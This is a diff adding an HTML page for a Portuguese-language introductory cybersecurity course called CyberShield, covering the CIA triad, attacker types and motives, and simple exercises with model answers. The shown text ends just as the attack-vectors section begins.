@@ -1,0 +1,2573 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberShield — Curso de Cybersecurity do 0 ao Avançado</title>
+<style>
+  :root {
+    --bg: #0a0e17;
+    --bg2: #111827;
+    --bg3: #1f2937;
+    --card: #1a1f2e;
+    --border: #2d3748;
+    --text: #e2e8f0;
+    --text2: #94a3b8;
+    --accent: #38bdf8;
+    --accent2: #818cf8;
+    --green: #34d399;
+    --red: #f87171;
+    --yellow: #fbbf24;
+    --orange: #fb923c;
+    --gradient1: linear-gradient(135deg, #38bdf8, #818cf8);
+    --gradient2: linear-gradient(135deg, #818cf8, #c084fc);
+    --gradient3: linear-gradient(135deg, #34d399, #38bdf8);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ===== HERO ===== */
+  .hero {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 2rem;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(56,189,248,0.08) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 50%, rgba(129,140,248,0.08) 0%, transparent 60%),
+      var(--bg);
+    position: relative;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: url("data:image/svg+xml,%3Csvg width='60' height='60' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='p' width='60' height='60' patternUnits='userSpaceOnUse'%3E%3Cpath d='M30 0 L60 30 L30 60 L0 30 Z' fill='none' stroke='%2338bdf8' stroke-width='0.3' opacity='0.15'/%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='url(%23p)'/%3E%3C/svg%3E");
+    opacity: 0.4;
+  }
+  .hero-content { position: relative; z-index: 1; max-width: 800px; }
+  .hero-badge {
+    display: inline-block;
+    padding: 0.4rem 1.2rem;
+    border-radius: 999px;
+    background: rgba(56,189,248,0.12);
+    border: 1px solid rgba(56,189,248,0.3);
+    color: var(--accent);
+    font-size: 0.85rem;
+    font-weight: 600;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 1.5rem;
+  }
+  .hero h1 {
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 800;
+    line-height: 1.1;
+    margin-bottom: 1rem;
+    background: var(--gradient1);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero h1 .accent { background: var(--gradient2); -webkit-background-clip: text; background-clip: text; }
+  .hero p {
+    font-size: 1.2rem;
+    color: var(--text2);
+    max-width: 600px;
+    margin: 0 auto 2rem;
+  }
+  .hero-stats {
+    display: flex;
+    gap: 2.5rem;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-top: 2.5rem;
+  }
+  .stat {
+    text-align: center;
+  }
+  .stat-num {
+    font-size: 2.2rem;
+    font-weight: 800;
+    background: var(--gradient3);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .stat-label {
+    color: var(--text2);
+    font-size: 0.9rem;
+    margin-top: 0.3rem;
+  }
+
+  .scroll-indicator {
+    position: absolute;
+    bottom: 2rem;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.4rem;
+    color: var(--text2);
+    font-size: 0.75rem;
+    animation: bounce 2s infinite;
+  }
+  .scroll-indicator .arrow {
+    width: 20px; height: 20px;
+    border-right: 2px solid var(--text2);
+    border-bottom: 2px solid var(--text2);
+    transform: rotate(45deg);
+  }
+  @keyframes bounce {
+    0%, 100% { transform: translateX(-50%) translateY(0); }
+    50% { transform: translateX(-50%) translateY(8px); }
+  }
+
+  /* ===== NAV ===== */
+  .nav {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 100;
+    background: rgba(10,14,23,0.85);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+    padding: 0.8rem 2rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .nav-logo {
+    font-size: 1.1rem;
+    font-weight: 700;
+    background: var(--gradient1);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .nav-tabs {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+  }
+  .nav-tab {
+    padding: 0.45rem 1rem;
+    border-radius: 6px;
+    border: 1px solid transparent;
+    color: var(--text2);
+    font-size: 0.85rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-decoration: none;
+  }
+  .nav-tab:hover { color: var(--text); border-color: var(--border); }
+  .nav-tab.active {
+    color: var(--accent);
+    border-color: rgba(56,189,248,0.4);
+    background: rgba(56,189,248,0.08);
+  }
+
+  /* ===== CONTENT ===== */
+  .content {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 2rem 1.5rem 4rem;
+  }
+
+  .section {
+    margin-bottom: 3rem;
+    scroll-margin-top: 80px;
+  }
+  .section:last-child { margin-bottom: 0; }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+    padding-bottom: 0.8rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-num {
+    width: 42px;
+    height: 42px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2rem;
+    font-weight: 800;
+    flex-shrink: 0;
+  }
+  .section-header h2 {
+    font-size: 1.6rem;
+    font-weight: 700;
+  }
+  .section-header .tag {
+    margin-left: auto;
+    font-size: 0.8rem;
+    padding: 0.25rem 0.8rem;
+    border-radius: 999px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  /* tags */
+  .tag-basics   { background: rgba(52,211,153,0.12); color: var(--green); border: 1px solid rgba(52,211,153,0.25); }
+  .tag-intermediate { background: rgba(251,191,36,0.12); color: var(--yellow); border: 1px solid rgba(251,191,36,0.25); }
+  .tag-advanced { background: rgba(248,113,113,0.12); color: var(--red); border: 1px solid rgba(248,113,113,0.25); }
+
+  /* ===== CARDS ===== */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 1.5rem;
+    margin-bottom: 1.2rem;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+  .card:hover {
+    border-color: rgba(56,189,248,0.25);
+    transform: translateY(-1px);
+  }
+  .card-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    margin-bottom: 0.6rem;
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+  }
+  .card-title .icon {
+    font-size: 1.3rem;
+  }
+  .card p { color: var(--text2); margin-bottom: 0.6rem; }
+  .card p:last-child { margin-bottom: 0; }
+
+  .highlight {
+    color: var(--accent);
+    font-weight: 600;
+  }
+  .warn {
+    color: var(--yellow);
+    font-weight: 600;
+  }
+  .danger {
+    color: var(--red);
+    font-weight: 600;
+  }
+
+  .inline-code {
+    background: rgba(129,140,248,0.1);
+    border: 1px solid rgba(129,140,248,0.2);
+    padding: 0.15em 0.5em;
+    border-radius: 4px;
+    font-family: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', monospace;
+    font-size: 0.9em;
+    color: var(--accent2);
+  }
+
+  /* ===== CODE BLOCKS ===== */
+  .code-block {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 1rem 0;
+  }
+  .code-block-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.5rem 1rem;
+    background: rgba(255,255,255,0.03);
+    border-bottom: 1px solid var(--border);
+    font-size: 0.8rem;
+    color: var(--text2);
+  }
+  .code-block-header .dots {
+    display: flex;
+    gap: 5px;
+  }
+  .code-block-header .dots span {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+  }
+  .code-block-header .dots span:nth-child(1) { background: #ff5f57; }
+  .code-block-header .dots span:nth-child(2) { background: #febc2e; }
+  .code-block-header .dots span:nth-child(3) { background: #28c840; }
+  .code-block-header .lang {
+    font-weight: 600;
+    color: var(--text);
+  }
+  .code-block pre {
+    padding: 1rem 1.2rem;
+    overflow-x: auto;
+    font-family: 'Cascadia Code', 'Fira Code', monospace;
+    font-size: 0.9rem;
+    line-height: 1.6;
+    color: var(--text);
+    tab-size: 2;
+  }
+  .code-block pre .comment { color: #8b949e; font-style: italic; }
+  .code-block pre .keyword { color: #ff7b72; }
+  .code-block pre .string { color: #a5d6ff; }
+  .code-block pre .cmd { color: #d2a8ff; }
+  .code-block pre .flags { color: #79c0ff; }
+  .code-block pre .output { color: #7ee787; }
+
+  /* ===== EXERCISES ===== */
+  .exercise {
+    background: linear-gradient(135deg, rgba(56,189,248,0.04), rgba(129,140,248,0.04));
+    border: 1px solid rgba(56,189,248,0.15);
+    border-radius: 12px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .exercise-badge {
+    display: inline-block;
+    padding: 0.25rem 0.8rem;
+    border-radius: 6px;
+    font-size: 0.8rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 0.8rem;
+  }
+  .badge-easy    { background: rgba(52,211,153,0.15); color: var(--green); border: 1px solid rgba(52,211,153,0.3); }
+  .badge-medium  { background: rgba(251,191,36,0.15); color: var(--yellow); border: 1px solid rgba(251,191,36,0.3); }
+  .badge-hard    { background: rgba(248,113,113,0.15); color: var(--red); border: 1px solid rgba(248,113,113,0.3); }
+  .badge-pro     { background: rgba(192,132,252,0.15); color: #c084fc; border: 1px solid rgba(192,132,252,0.3); }
+
+  .exercise h3 {
+    font-size: 1.2rem;
+    font-weight: 700;
+    margin-bottom: 0.5rem;
+  }
+  .exercise .desc {
+    color: var(--text2);
+    margin-bottom: 1rem;
+  }
+  .exercise .goal {
+    background: rgba(52,211,153,0.06);
+    border-left: 3px solid var(--green);
+    padding: 0.6rem 1rem;
+    border-radius: 0 6px 6px 0;
+    margin-bottom: 1rem;
+    font-size: 0.95rem;
+  }
+  .exercise .goal strong { color: var(--green); }
+
+  .step-list {
+    list-style: none;
+    padding: 0;
+    counter-reset: step;
+  }
+  .step-list li {
+    counter-increment: step;
+    padding: 0.5rem 0 0.5rem 2.5rem;
+    position: relative;
+    color: var(--text2);
+    margin-bottom: 0.3rem;
+  }
+  .step-list li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0.5rem;
+    width: 1.8rem;
+    height: 1.8rem;
+    background: rgba(56,189,248,0.1);
+    border: 1px solid rgba(56,189,248,0.25);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.8rem;
+    font-weight: 700;
+    color: var(--accent);
+  }
+
+  .hint {
+    background: rgba(251,191,36,0.06);
+    border-left: 3px solid var(--yellow);
+    padding: 0.6rem 1rem;
+    border-radius: 0 6px 6px 0;
+    margin-top: 0.8rem;
+    font-size: 0.9rem;
+    color: var(--yellow);
+  }
+  .hint::before { content: '💡 Dica: '; font-weight: 700; }
+
+  .solution-toggle {
+    margin-top: 0.8rem;
+    background: rgba(56,189,248,0.08);
+    border: 1px solid rgba(56,189,248,0.2);
+    padding: 0.6rem 1rem;
+    border-radius: 8px;
+    cursor: pointer;
+    color: var(--accent);
+    font-weight: 600;
+    font-size: 0.9rem;
+    transition: all 0.2s;
+    width: 100%;
+    text-align: center;
+  }
+  .solution-toggle:hover {
+    background: rgba(56,189,248,0.15);
+    border-color: rgba(56,189,248,0.4);
+  }
+  .solution-content {
+    display: none;
+    margin-top: 1rem;
+    padding: 1rem;
+    background: rgba(0,0,0,0.2);
+    border-radius: 8px;
+    font-family: 'Cascadia Code', monospace;
+    font-size: 0.87rem;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    color: var(--text);
+  }
+  .solution-content.show { display: block; }
+  .solution-content .comment { color: #8b949e; }
+
+  /* ===== SALARY TABLE ===== */
+  .salary-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+    font-size: 0.95rem;
+  }
+  .salary-table th {
+    background: rgba(56,189,248,0.08);
+    padding: 0.8rem 1rem;
+    text-align: left;
+    font-weight: 700;
+    color: var(--accent);
+    border-bottom: 2px solid rgba(56,189,248,0.2);
+  }
+  .salary-table td {
+    padding: 0.7rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+  }
+  .salary-table tr:hover td { background: rgba(56,189,248,0.03); color: var(--text); }
+  .salary-table .salary {
+    font-weight: 700;
+    color: var(--green);
+    font-family: 'Cascadia Code', monospace;
+  }
+  .salary-table .salary.entry { color: var(--yellow); }
+  .salary-table .salary.mid { color: var(--orange); }
+  .salary-table .salary.senior { color: var(--red); }
+
+  /* ===== ROADMAP ===== */
+  .roadmap {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  .roadmap-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 1rem;
+    padding: 1rem 1.2rem;
+    border-bottom: 1px solid var(--border);
+    transition: background 0.2s;
+  }
+  .roadmap-step:last-child { border-bottom: none; }
+  .roadmap-step:hover { background: rgba(56,189,248,0.03); }
+  .roadmap-step .step-num {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: var(--bg3);
+    border: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 0.9rem;
+    flex-shrink: 0;
+    margin-top: 0.1rem;
+  }
+  .roadmap-step.completed .step-num {
+    background: var(--green);
+    border-color: var(--green);
+    color: #000;
+  }
+  .roadmap-step .step-info h4 {
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 0.2rem;
+  }
+  .roadmap-step .step-info p {
+    font-size: 0.85rem;
+    color: var(--text2);
+  }
+  .roadmap-step .step-time {
+    font-size: 0.75rem;
+    color: var(--accent);
+    margin-top: 0.2rem;
+    font-weight: 600;
+  }
+
+  /* ===== QUOTES / CALLOUTS ===== */
+  .callout {
+    padding: 1.2rem 1.5rem;
+    border-radius: 10px;
+    margin: 1.2rem 0;
+    border-left: 4px solid;
+    font-size: 0.95rem;
+  }
+  .callout.info    { background: rgba(56,189,248,0.06); border-color: var(--accent); }
+  .callout.warning { background: rgba(251,191,36,0.06); border-color: var(--yellow); }
+  .callout.danger  { background: rgba(248,113,113,0.06); border-color: var(--red); }
+  .callout.success { background: rgba(52,211,153,0.06); border-color: var(--green); }
+  .callout strong { display: block; margin-bottom: 0.3rem; }
+
+  /* ===== TERMINAL ===== */
+  .terminal {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 1rem 0;
+  }
+  .terminal-header {
+    padding: 0.5rem 1rem;
+    background: #161b22;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    font-size: 0.85rem;
+    color: var(--text2);
+  }
+  .terminal-header .prompt {
+    color: var(--green);
+    font-weight: 700;
+  }
+  .terminal-body {
+    padding: 1rem 1.2rem;
+    font-family: 'Cascadia Code', 'Fira Code', monospace;
+    font-size: 0.9rem;
+    line-height: 1.6;
+    color: var(--text);
+  }
+  .terminal-body .cmd { color: #d2a8ff; }
+  .terminal-body .output { color: #7ee787; }
+  .terminal-body .error { color: #f87171; }
+  .terminal-body .info  { color: #79c0ff; }
+
+  /* ===== CHECKLIST ===== */
+  .checklist {
+    list-style: none;
+    padding: 0;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 0.5rem;
+  }
+  .checklist li {
+    padding: 0.4rem 0.8rem;
+    border-radius: 6px;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid var(--border);
+    font-size: 0.9rem;
+    color: var(--text2);
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .checklist li::before {
+    content: '☐';
+    color: var(--text2);
+    font-size: 1.1rem;
+  }
+
+  /* ===== FOOTER ===== */
+  .footer {
+    text-align: center;
+    padding: 3rem 1.5rem;
+    border-top: 1px solid var(--border);
+    color: var(--text2);
+    font-size: 0.85rem;
+  }
+  .footer a {
+    color: var(--accent);
+    text-decoration: none;
+  }
+  .footer a:hover { text-decoration: underline; }
+
+  /* ===== RESPONSIVE ===== */
+  @media (max-width: 600px) {
+    .nav { padding: 0.6rem 1rem; }
+    .nav-tabs { gap: 0.3rem; }
+    .nav-tab { padding: 0.3rem 0.6rem; font-size: 0.75rem; }
+    .content { padding: 1.5rem 1rem 3rem; }
+    .hero-stats { gap: 1.5rem; }
+    .checklist { grid-template-columns: 1fr; }
+  }
+
+  /* smooth scroll */
+  html { scroll-behavior: smooth; }
+
+  /* section transitions */
+  .section { opacity: 0; transform: translateY(15px); animation: fadeUp 0.5s ease forwards; }
+  @keyframes fadeUp {
+    to { opacity: 1; transform: translateY(0); }
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== NAVEGAÇÃO ===== -->
+<nav class="nav">
+  <div class="nav-logo">CyberShield ⚡</div>
+  <div class="nav-tabs">
+    <a class="nav-tab active" href="#basics">Básico</a>
+    <a class="nav-tab" href="#intermediario">Intermediário</a>
+    <a class="nav-tab" href="#avancado">Avançado</a>
+    <a class="nav-tab" href="#carreira">Carreira</a>
+    <a class="nav-tab" href="#roadmap">Roteiro</a>
+  </div>
+</nav>
+
+<!-- ===== HERO ===== -->
+<section class="hero">
+  <div class="hero-content">
+    <div class="hero-badge">Curso Completo • Do Zero ao Avançado</div>
+    <h1>Cyber<span class="accent">Shield</span></h1>
+    <p>
+      De zero a profissional em cybersecurity. Tudo explicado linha por linha —
+      conceitos, ameaças reais, ferramentas, salários, desafios e exercícios práticos
+      para você construir uma carreira sólida na área.
+    </p>
+    <div class="hero-stats">
+      <div class="stat">
+        <div class="stat-num">0→A+</div>
+        <div class="stat-label">Nível do curso</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num">20+</div>
+        <div class="stat-label">Exercícios práticos</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num">BR</div>
+        <div class="stat-label">Mercado brasileiro</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num">2026</div>
+        <div class="stat-label">Atualizado</div>
+      </div>
+    </div>
+  </div>
+  <div class="scroll-indicator">
+    <span>Role para baixo</span>
+    <div class="arrow"></div>
+  </div>
+</section>
+
+<!-- ===== CONTEÚDO PRINCIPAL ===== -->
+<main class="content">
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 1: O QUE É CYBERSECURITY?                  -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="basics">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">01</div>
+    <h2>O que é Cybersecurity?</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🛡️</span> Definição</div>
+    <p>
+      <span class="highlight">Cybersecurity</span> (segurança cibernética) é a prática de
+      proteger sistemas, redes, programas, dispositivos e dados contra ataques digitais.
+      O objetivo é garantir três coisas fundamentais — a <span class="highlight">Tríade CIA</span>:
+    </p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🔐</span> A Tríade CIA (o coração da segurança)</div>
+    <p>Toda decisão de segurança se baseia nesses três pilares. Entender isso é o primeiro passo:</p>
+    <div style="display:flex;gap:1rem;margin-top:1rem;flex-wrap:wrap;">
+      <div style="flex:1;min-width:180px;background:rgba(56,189,248,0.05);border-radius:10px;padding:1rem;border:1px solid rgba(56,189,248,0.12);">
+        <div style="color:var(--accent);font-weight:700;font-size:1.2rem;margin-bottom:0.4rem;">C — Confidentiality</div>
+        <p style="color:var(--text2);font-size:0.9rem;">
+          <strong style="color:var(--text);font-size:0.95rem;">Sigilo</strong> — só quem tem permissão acessa.
+          Ex: senhas, criptografia, controle de acesso. Se um email vazar, a confidencialidade quebrou.
+        </p>
+      </div>
+      <div style="flex:1;min-width:180px;background:rgba(251,191,36,0.05);border-radius:10px;padding:1rem;border:1px solid rgba(251,191,36,0.12);">
+        <div style="color:var(--yellow);font-weight:700;font-size:1.2rem;margin-bottom:0.4rem;">I — Integrity</div>
+        <p style="color:var(--text2);font-size:0.9rem;">
+          <strong style="color:var(--text);font-size:0.95rem;">Integridade</strong> — os dados não foram alterados
+          indevidamente. Ex: checksums, hash SHA-256, assinaturas digitais. Se um hacker altera o saldo do banco,
+          a integridade quebrou.
+        </p>
+      </div>
+      <div style="flex:1;min-width:180px;background:rgba(52,211,153,0.05);border-radius:10px;padding:1rem;border:1px solid rgba(52,211,153,0.12);">
+        <div style="color:var(--green);font-weight:700;font-size:1.2rem;margin-bottom:0.4rem;">A — Availability</div>
+        <p style="color:var(--text2);font-size:0.9rem;">
+          <strong style="color:var(--text);font-size:0.95rem;">Disponibilidade</strong> — os sistemas estão acessíveis
+          quando precisamos. Ex: DDoS quebra disponibilidade, backups e redundância a protegem.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>🧠 Memoriza isso:</strong>
+    CIA não é uma agência de inteligência — é o modelo fundamental. Qualquer política de segurança
+    é um trade-off entre esses três pilares. Mais segurança (confidencialidade) pode reduzir usabilidade
+    (disponibilidade). O trabalho do profissional é <span class="highlight">equilibrar</span>.
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🌐</span> Por que isso importa HOJE?</div>
+    <p>
+      Em 2026, tudo é digital: seu dinheiro (bancos), sua identidade (gov.br, CPF), sua comunicação
+      (WhatsApp, e-mail), sua empresa (sistemas internos, clientes), até seu carro e casa.
+      Um ataque pode causar:
+    </p>
+    <p>
+      <span class="danger">Ransomware:</span> dados criptografados, empresa parada, milhões em resgate.<br>
+      <span class="danger">Data breach:</span> milhões de CPFs/vidas expostos (ex: coleções "Breach" no dark web).<br>
+      <span class="danger">Espionagem:</span> segredos industriais roubados por competidores ou estados.<br>
+      <span class="danger">Fraude:</span> golpes que custam bilhões por ano no Brasil.
+    </p>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-easy">Exercício 01 — Fácil</span>
+    <h3>Exercício: Mapeie a CIA no seu dia a dia</h3>
+    <p class="desc">
+      Identification de exemplos reais de Confidencialidade, Integridade e Disponibilidade na sua vida.
+    </p>
+    <div class="goal">
+      <strong>🎯 Objetivo:</strong> Escrever 3 exemplos de cada pilar CIA que você já usa ou depende.
+    </div>
+    <ol class="step-list">
+      <li>Pense em um sistema que você usa todo dia (WhatsApp, banco, e-mail, redes sociais).</li>
+      <li>Pergunte: o que aconteceria se o <span class="highlight">sigilo</span> quebrasse? (ex: alguém lê sua conversa do WhatsApp)</li>
+      <li>Pergunte: o que aconteceria se a <span class="highlight">integridade</span> quebrasse? (ex: alguém altera o valor da transferência)</li>
+      <li>Pergunte: o que aconteceria se a <span class="highlight">disponibilidade</span> quebrasse? (ex: banco cai por 2 horas)</li>
+      <li>Anote tudo. Isso é segurança cibernética aplicada — você já pensa nisso.</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+Exemplo WhatsApp:
+  C: Mensagens têm cifra de ponta a ponta (End-to-End Encryption) — apenas você e o destinatário leem.
+  I: Se o WhatsApp permitisse que um servidor modificasse mensagens no trânsito, a integridade quebraria.
+  A: Se os servidores caíssem pelo dia todo, você não mandaria nem receberia mensagens.
+
+Exemplo Banco:
+  C: Login com senha + 2FA — só você acessa sua conta.
+  I: O sistema deve garantir que R$100 transferidos não mudem para R$1000 no registro.
+  A: O app e o site precisam estar online quando você precisa.
+
+Exemplo Gov.br:
+  C: Seu CPF e dados pessoais são confidenciais — só você e o governo autorizado acessam.
+  I: Se alguém alterasse seu dado de endereço sem sua permissão, a integridade quebraria.
+  A: O portal precisa estar acessível quando você precisa usar um serviço.
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 2: OS ADVERSÁRIOS — QUEM ATACA E POR QUÊ?   -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="adv adversaries">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">02</div>
+    <h2>Quem ataca? Os adversários e seus motivos</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🎭</span> Tipos de atacantes</div>
+    <p style="margin-bottom:0.8rem;">Não existe "hacker único". O perfil muda o que eles querem e como agem:</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="dots"><span></span><span></span><span></span></span>
+        <span style="font-family:monospace;font-size:0.85rem;">cybershield@lesson:~$ cat atacantes.txt</span>
+      </div>
+      <div class="terminal-body">
+<span class="cmd">Script Kiddie</span> — <span class="output">Iniciante que usa ferramentas prontas sem entender.</span><br>
+  Motivo: curiosidade, "pixeira", impressão. Baixo risco, mas existente.<br><br>
+
+<span class="cmd">Cracker / Cybercriminal</span> — <span class="output">Financia-se através do crime.</span><br>
+  Motivo: dinheiro. Ransomware, roubo de cartão, fraude, tráfico de dados.<br>
+  Valor médio de ransomware no Brasil: ~US$ 50K–500K por vítima (dados 2024–2025).<br><br>
+
+<span class="cmd">Insider (colaborador interno)</span> — <span class="output">Alguém dentro da empresa.</span><br>
+  Motivo: vingança, ganância, negligência, ou coercão. <span class="warn">Mais perigoso que externo</span>
+  porque já tem acesso legítimo e know-how.<br><br>
+
+<span class="cmd">Grupo APT (Advanced Persistent Threat)</span> — <span class="output">Ataque sofisticado, persistente, focado.</span><br>
+  Motivo: espionagem, sabotagem, ganho geopolítico. Frequentemente ligado a estados-nacionais
+  (ex: grupos chineses, russos, norte-americanos, etc.). Faturam milhões em operações.<br><br>
+
+<span class="cmd">Hacktivista</span> — <span class="output">Ataca por causa política/ideológica.</span><br>
+  Motivo: protesto,.alertar, desacreditar. Defacemento de sites, DDoS simbólico.<br>
+  Ex: Anonymous, grupos de ativismo digital.<br><br>
+
+<span class="cmd">Researcher / Pirata Ético</span> — <span class="output">Testa sistemas com permissão.</span><br>
+  Motivo: aprendizado, premiação (bug bounty), ou profissão. É <span class="highlight">o seu futuro</span>.
+</div>
+    </div>
+  </div>
+
+  <div class="callout warning">
+    <strong>⚠️ Realidade do mercado:</strong>
+    Muitos profissionais iniciantes acham que "hackers são geniais soltos". Na prática:
+    a maioria dos incidentes usa <span class="highlight">vetores simples</span> — phishing,
+    senhas fracas, não aplicar patch. O trabalhador de segurança muitas vezes está
+    <span class="highlight">combatendo preguiça e falhaHumana</span>, não só técnica.
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-easy">Exercício 02 — Fácil</span>
+    <h3>Exercício: Classifique o atacante</h3>
+    <p class="desc">Dê os cenários abaixo, identifique o tipo de atacante mais provável e o motivo.</p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Praticar identificação de adversário — essencial para design de defesa.</div>
+    <ol class="step-list">
+      <li>Cenário A: Uma empresa de tecnologia descobre que seus planos de 5 anos foram vazados.
+        O vazamento veio de um servidor interno acessado por um ex-empregado com acesso ainda válido.</li>
+      <li>Cenário B: Um hospital pequeno recebe ransomware, seus prontuários ficam criptografados,
+        pede US$ 30.000 em Bitcoin.</li>
+      <li>Cenário C: Um site de um partido político é alterado com um manifesto político em sua página inicial,
+        mas nenhum dado foi roubado.</li>
+      <li>Cenário D: Um garoto de 15 anos usa um script de DDoS que baixou da internet para atacar
+        um servidor de jogo online. Ele não tem conhecimento técnico profundo.</li>
+      <li>Para cada, escreva: tipo de atacante, motivo provável, e qual pilar CIA o ataque afeta.</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+A — Insider (ex-empregado): Motivo: vingança/ganância/atentismo.
+   CIA: Confidencialidade (vazamento de documentos).
+B — Cracker/Cybercriminal: Motivo: dinheiro (ransomware).
+   CIA: Confidencialidade (potencial vazamento antes), Integridade (criptografia dos dados),
+       Disponibilidade (prontuários inacessíveis — crítico em hospital!).
+C — Hacktivista: Motivo: ideológico/protesto.
+   CIA: Integridade (conteúdo do site alterado), Disponibilidade temporária (site fora do ar na troca).
+D — Script Kiddie: Motivo: curiosidade/baixo nível.
+   CIA: Disponibilidade (DDoS prende o servidor de jogo).
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 3: VETORES DE ATAQUE — COMO OSATAQUE ACONTECE -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="vetores">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">03</div>
+    <h2>Vetores de Ataque — Como o ataque acontece</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📌</span> O que é um "vetor de ataque"?</div>
+    <p>
+      Um <span class="highlight">vetor de ataque</span> é o caminho ou método que o atacante usa
+      para comprometer um sistema. Entender vetores é o primeiro passo para <span class="highlight">defender</span> —
+      você não pode bloquear o que não conhece.
+    </p>
+  </div>
+
+  <!-- Vetores principais -->
